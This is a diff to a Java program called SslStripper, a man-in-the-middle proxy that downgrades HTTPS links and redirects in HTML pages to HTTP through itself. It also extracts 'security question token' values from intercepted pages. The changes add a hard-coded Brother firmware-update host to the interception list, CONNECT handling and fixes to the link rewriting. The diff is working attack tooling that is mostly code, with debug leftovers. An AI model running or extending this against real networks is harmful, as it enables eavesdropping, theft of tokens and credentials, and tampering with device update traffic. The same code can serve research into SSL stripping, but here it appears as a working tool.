@@ -5,7 +5,9 @@ import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
 import java.io.StringReader;
+import java.lang.reflect.Array;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
@@ -42,9 +44,15 @@ public class SslStripper {
 			System.err.println(e.getMessage());
 			return;
 		}
+		// SPECIAL STUFF
+		
+		SocketConnectorFactory.addHost("firmverup.brother.co.jp");
+		
+		//SPECIAL STUFF END
+		
 		MyThreadExecutor executor = MyThreadExecutor.getInstance();
 		executor.execute(new TcpSocketDispatcher(serverSocket, PROXY_PORT));
-
+		
 		System.err.println("Server running...");
 
 		InputStreamReader c = new InputStreamReader(System.in);
@@ -95,9 +103,9 @@ class ExtractSecurityToken extends Filter {
 			String contentType = response.getContentType();
 			if (contentType != null && contentType.indexOf(HTML_CONTENT_TYPE) != -1) {
 				String body = new String(response.getBody());
-				
+
 				BufferedReader bodyReader = new BufferedReader(new  StringReader(body));
-				
+
 				String currentLine;
 				while ((currentLine = bodyReader.readLine()) != null) {
 					if (currentLine.toLowerCase().indexOf("security question token:") != -1) {
@@ -106,7 +114,7 @@ class ExtractSecurityToken extends Filter {
 						System.out.println(tokenCommentLine[4]);
 					}
 				}
-				
+
 			}
 		}
 		catch (IOException e) {
@@ -122,7 +130,10 @@ class HttpResponseManipulationFilter extends Filter {
 	Object transform(Object data) {
 
 		HTTPResponse response = (HTTPResponse) data;
-		if (response.getStatusCode() >= 300 && response.getStatusCode() < 400) {
+
+		setCookiesLabel:if (response.getStatusCode() >= 300 && response.getStatusCode() < 400) {
+			if (!response.hasAbsoluteLocation()) 
+				break setCookiesLabel;
 			String location = response.getLocation();
 			String protocol = location.split("://")[0];
 			String withoutProtocol = location.split("://")[1];
@@ -168,7 +179,7 @@ class HttpResponseManipulationFilter extends Filter {
 class SslStripperFilter extends Filter {
 
 	private static final String HTML_CONTENT_TYPE = "text/html";
-	private static final String LINK_TAG_START = "<a href";
+	private static final String LINK_TAG_START = "<a ";
 	private static final String FORM_TAG_START = "<form";
 
 	public Object transform(Object data) {
@@ -252,35 +263,52 @@ class SslStripperFilter extends Filter {
 		String stringBody = new String(response.getBody());
 
 		int currentOccurrance = 0;
+
 		while ((currentOccurrance = stringBody.indexOf(LINK_TAG_START,currentOccurrance)) != -1) {
-			int endLink = stringBody.substring(currentOccurrance + 9).indexOf("\"") + currentOccurrance + 9;	
-			String currentLink = stringBody.substring(currentOccurrance + 9, endLink);
+			currentOccurrance += stringBody.substring(currentOccurrance).indexOf("href");
+			int endLink = stringBody.substring(currentOccurrance + 6).indexOf("\"") + currentOccurrance + 6;	
+			String currentLink = stringBody.substring(currentOccurrance + 6, endLink);
 
-
-
+			String protocol = "";
+			String splitAtProtocol [] = null;
+			String withoutProtocol = currentLink;
+				
+			if (!currentLink.startsWith("http") && !currentLink.startsWith("#") && currentLink.startsWith("//")){
+				currentLink = "http://" + currentLink.replaceFirst("[/]+", "");
+			}
 			if (currentLink.startsWith("http")) {
 				// add Port to url
-				String protocol = currentLink.split("://")[0];
-				String withoutProtocol = currentLink.split("://")[1];
-				String [] uriAndLocator = withoutProtocol.split("/",2);
-				currentLink = protocol + "://" +  uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
-				if (uriAndLocator.length == 2) {
-					currentLink += "/" + uriAndLocator[1];
+				protocol = currentLink.split("://")[0];
+				splitAtProtocol = currentLink.split("://");
+				withoutProtocol = splitAtProtocol[1];// = currentLink.split("://")[1];
+				for (int i = 2; i < splitAtProtocol.length; i++) {
+					withoutProtocol += "://" + splitAtProtocol[i];
 				}
-				String stringBodyBeforeLink = stringBody.substring(0,currentOccurrance + 9);
-				if (currentLink.startsWith("https")) {
-					SocketConnectorFactory.addHost(uriAndLocator[0]);
-					currentLink = currentLink.replaceFirst("https", "http");
-				}
-				stringBody = stringBodyBeforeLink + currentLink + stringBody.substring(endLink);				 
+				currentLink = protocol + "://";
+			
 			}
+			if (currentLink.indexOf("hardware") > 0) {
+				System.out.println("ffoooo");
+			}
+			String [] uriAndLocator = withoutProtocol.split("/",2);
+			currentLink += uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
+			if (uriAndLocator.length == 2) {
+				currentLink += "/" + uriAndLocator[1];
+			}
+			String stringBodyBeforeLink = stringBody.substring(0,currentOccurrance + 6);
+			if (currentLink.startsWith("https")) {
+				SocketConnectorFactory.addHost(uriAndLocator[0]);
+				currentLink = currentLink.replaceFirst("https", "http");
+			}
+			stringBody = stringBodyBeforeLink + currentLink + stringBody.substring(endLink);	
 			currentOccurrance++;
 		}
+
+
 		response.setBody(stringBody.getBytes());
+
 	}
-
 }
-
 class TcpSocketDispatcher implements Runnable {
 	private ServerSocket socket;
 	private int port;
@@ -433,6 +461,18 @@ class HTTPResponse {
 		}
 		catch (IOException e) {
 			return null;
+		}
+	}
+
+	public boolean hasAbsoluteLocation() {
+		try {
+			String loc = findValue("Location");
+			if (loc == null) {
+				return false;
+			}
+			return (loc.matches("[a-z]+://"));
+		}catch (IOException e) {
+			return false;
 		}
 	}
 
@@ -674,7 +714,8 @@ class HTTPParser {
 			HTTPRequestParameters params;
 			int port;
 			String[] methodLineArray = methodLine.split(" ");
-			if (methodLineArray[0].matches("GET") || methodLineArray[0].matches("POST") || methodLineArray[0].matches("PUT") || methodLineArray[0].matches("DELETE")) {
+			if (methodLineArray[0].matches("GET") || methodLineArray[0].matches("POST") || methodLineArray[0].matches("PUT") || methodLineArray[0].matches("DELETE")
+					|| methodLineArray[0].matches("CONNECT")) {
 				method = methodLineArray[0];
 				String resourceString = methodLineArray[1];
 				String[] resourceParamsArray = resourceString.split("\\?");
@@ -822,6 +863,7 @@ abstract class SocketConnection {
 	}
 
 	public void write(String data) throws IOException {
+		OutputStreamWriter blah;
 		int length = data.length();
 		int nrOfChunks = length / 65535;
 		int correctedNrOfChunks = (length % 65535) == 0 ? nrOfChunks : nrOfChunks + 1;
@@ -840,6 +882,7 @@ abstract class SocketConnection {
 		for (int i = 0; i < correctedNrOfChunks; i++) {
 			writeBuffer = data.substring(i * 65535 + offset, (i + 1) * 65535 + offset).getBytes();
 			output.write(writeBuffer);
+
 		}
 		output.flush();
 
@@ -944,11 +987,12 @@ class Proxy {
 			int readChars = 0;
 			int currentAvailable = 0;
 
-			while((currentAvailable = input.available()) > 0) {
+			while((currentAvailable = input.available()) > 0 || inputString.length() == 0) {
 				readChars = input.read(readBuffer,0,currentAvailable);		
 				inputString += new String(readBuffer).substring(0, readChars);
 			}
 
+			System.err.println("input string: " + inputString);
 			HTTPRequest request = HTTPParser.getInstance().parse(inputString);
 
 			if (request == null) {
@@ -1113,3 +1157,4 @@ class MyThreadExecutor implements Executor
 		return threadExecutor;
 	}
 }
+
